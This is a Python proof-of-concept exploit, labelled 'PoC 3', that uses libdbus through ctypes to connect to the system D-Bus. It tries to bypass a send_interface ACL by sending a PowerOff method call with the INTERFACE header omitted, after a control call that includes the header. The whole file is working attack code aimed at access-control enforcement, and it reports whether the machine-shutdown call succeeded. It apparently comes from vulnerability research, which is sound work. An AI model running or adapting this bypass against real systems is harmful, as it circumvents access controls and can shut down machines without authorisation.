#!/usr/bin/env python3
"""PoC 3: Omit INTERFACE header to bypass send_interface ACL
Uses dbus_connection_open + dbus_bus_register to avoid autolaunch issues."""
import ctypes
import ctypes.util
import os
import sys

print(f"Current user: uid={os.getuid()}, euid={os.geteuid()}")

lib_path = ctypes.util.find_library("dbus-1")
if not lib_path:
    print("ERROR: libdbus-1 not found")
    sys.exit(1)

libdbus = ctypes.CDLL(lib_path)

class DBusError(ctypes.Structure):
    _fields_ = [
        ("name", ctypes.c_char_p),
        ("message", ctypes.c_char_p),
        ("dummy1", ctypes.c_uint),
        ("dummy2", ctypes.c_uint),
        ("dummy3", ctypes.c_uint),
        ("dummy4", ctypes.c_uint),
        ("dummy5", ctypes.c_void_p),
    ]

# Function signatures
libdbus.dbus_error_init.argtypes = [ctypes.POINTER(DBusError)]
libdbus.dbus_error_init.restype = None
libdbus.dbus_error_is_set.argtypes = [ctypes.POINTER(DBusError)]
libdbus.dbus_error_is_set.restype = ctypes.c_int

libdbus.dbus_connection_open.argtypes = [ctypes.c_char_p, ctypes.POINTER(DBusError)]
libdbus.dbus_connection_open.restype = ctypes.c_void_p

libdbus.dbus_bus_register.argtypes = [ctypes.c_void_p, ctypes.POINTER(DBusError)]
libdbus.dbus_bus_register.restype = ctypes.c_int

libdbus.dbus_message_new_method_call.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p]
libdbus.dbus_message_new_method_call.restype = ctypes.c_void_p

libdbus.dbus_connection_send_with_reply_and_block.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(DBusError)]
libdbus.dbus_connection_send_with_reply_and_block.restype = ctypes.c_void_p

libdbus.dbus_message_get_signature.argtypes = [ctypes.c_void_p]
libdbus.dbus_message_get_signature.restype = ctypes.c_char_p

libdbus.dbus_message_unref.argtypes = [ctypes.c_void_p]
libdbus.dbus_message_unref.restype = None

# Connect to system bus directly via socket
error = DBusError()
libdbus.dbus_error_init(ctypes.byref(error))

conn = libdbus.dbus_connection_open(b"unix:path=/run/dbus/system_bus_socket", ctypes.byref(error))
if not conn:
    if libdbus.dbus_error_is_set(ctypes.byref(error)):
        print(f"ERROR open: {error.name.decode()}: {error.message.decode()}")
    sys.exit(1)

# Register on the bus
err_reg = DBusError()
libdbus.dbus_error_init(ctypes.byref(err_reg))
ret = libdbus.dbus_bus_register(conn, ctypes.byref(err_reg))
if not ret:
    if libdbus.dbus_error_is_set(ctypes.byref(err_reg)):
        print(f"ERROR register: {err_reg.name.decode()}: {err_reg.message.decode()}")
    sys.exit(1)

print("[OK] Connected to system bus\n")

# Test 1: WITH INTERFACE (should be denied by ACL)
print("--- Test 1: PowerOff WITH INTERFACE (should be DENIED) ---")
msg1 = libdbus.dbus_message_new_method_call(
    b"org.example.PowerManager1",
    b"/org/example/PowerManager1",
    b"org.example.PowerManager1.Manager",
    b"PowerOff"
)
err1 = DBusError()
libdbus.dbus_error_init(ctypes.byref(err1))
reply1 = libdbus.dbus_connection_send_with_reply_and_block(conn, msg1, 5000, ctypes.byref(err1))
if reply1:
    print("[!] Got reply - ACL did NOT block!")
    libdbus.dbus_message_unref(reply1)
else:
    if libdbus.dbus_error_is_set(ctypes.byref(err1)):
        print(f"[OK] Denied: {err1.name.decode()}")
    else:
        print("[?] Failed (unknown)")
libdbus.dbus_message_unref(msg1)

# Test 2: WITHOUT INTERFACE (bypass attempt)
print("\n--- Test 2: PowerOff WITHOUT INTERFACE (bypass attempt) ---")
msg2 = libdbus.dbus_message_new_method_call(
    b"org.example.PowerManager1",
    b"/org/example/PowerManager1",
    None,  # INTERFACE = NULL (omitted!)
    b"PowerOff"
)
err2 = DBusError()
libdbus.dbus_error_init(ctypes.byref(err2))
reply2 = libdbus.dbus_connection_send_with_reply_and_block(conn, msg2, 5000, ctypes.byref(err2))
if reply2:
    sig = libdbus.dbus_message_get_signature(reply2)
    sig_str = sig.decode() if sig else "(empty)"
    print(f"[!!!] Got reply! Signature: {sig_str}")
    print("[!!!] ACL BYPASSED! PowerOff executed without INTERFACE header!")
    libdbus.dbus_message_unref(reply2)
else:
    if libdbus.dbus_error_is_set(ctypes.byref(err2)):
        print(f"[X] Denied: {err2.name.decode()}")
        print(f"    {err2.message.decode()[:200]}")
    else:
        print("[?] Failed (unknown)")
libdbus.dbus_message_unref(msg2)

print("\n--- Done ---")
